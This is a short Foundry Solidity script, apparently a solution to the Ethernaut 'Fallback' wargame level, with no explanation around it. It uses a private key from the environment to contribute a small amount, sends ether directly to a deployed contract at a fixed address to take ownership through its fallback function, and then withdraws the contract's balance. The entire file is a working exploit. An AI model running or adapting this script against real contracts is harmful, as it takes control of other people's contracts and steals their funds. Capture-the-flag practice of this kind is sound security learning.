// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Fallback.sol";

contract FallbackHackScript is Script {
  function setUp() public {}

  function run () public {
    uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");

    // Mock attacker
    vm.startBroadcast(attackerPrivateKey);
    Fallback fallbackContract = Fallback(payable(address(0x05eFeba13fa5E7527184F1041473c6cF6331e38d)));

    fallbackContract.contribute{value: 0.0001 ether}();
    console.log("contrib", fallbackContract.getContribution());
    (bool sent, ) = address(fallbackContract).call{value: 0.0001 ether}("");
    console.log("sent", sent);
    console.log("owner",fallbackContract.owner());
    fallbackContract.withdraw();
    vm.stopBroadcast();

    console.log("owner", fallbackContract.owner());
  }
}